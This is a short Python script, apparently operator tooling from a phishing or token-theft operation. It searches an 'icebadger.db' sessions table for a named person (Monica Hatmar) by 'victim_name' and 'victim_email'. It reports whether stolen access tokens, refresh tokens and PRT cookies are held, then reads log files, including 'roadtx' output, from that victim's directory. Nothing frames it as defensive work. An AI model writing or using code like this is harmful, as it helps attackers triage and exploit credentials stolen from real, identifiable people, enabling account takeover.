import sqlite3, os, json

conn = sqlite3.connect('icebadger.db')
conn.row_factory = sqlite3.Row
c = conn.cursor()
c.execute("SELECT * FROM sessions WHERE victim_name LIKE '%Monica%' OR victim_name LIKE '%Hatmar%' OR victim_email LIKE '%monica%' OR victim_email LIKE '%hatmar%'")
rows = [dict(r) for r in c.fetchall()]

print(f"Found {len(rows)} sessions:")
for r in rows:
    print("=" * 50)
    print("USER CODE:", r['user_code'])
    print("NAME:", r['victim_name'])
    print("EMAIL:", r['victim_email'])
    print("STATUS:", r['status'])
    print("HAS ACCESS TOKEN:", bool(r.get('access_token')))
    print("HAS REFRESH TOKEN:", bool(r.get('refresh_token')))
    print("HAS PRT COOKIE:", bool(r.get('prt_cookie')))
    vpath = os.path.join('victims', r['user_code'])
    print("VPATH:", vpath, "EXISTS:", os.path.exists(vpath))
    if os.path.exists(vpath):
        print("FILES IN VICTIM DIR:", os.listdir(vpath))
        # check any log files or error files
        for fname in os.listdir(vpath):
            fpath = os.path.join(vpath, fname)
            if fname.endswith(('.log', '.txt')) or 'roadtx' in fname:
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(500)
                        print(f"--- {fname} (first 500 chars) ---\n{content}")
                except Exception as e:
                    print(f"Error reading {fname}: {e}")
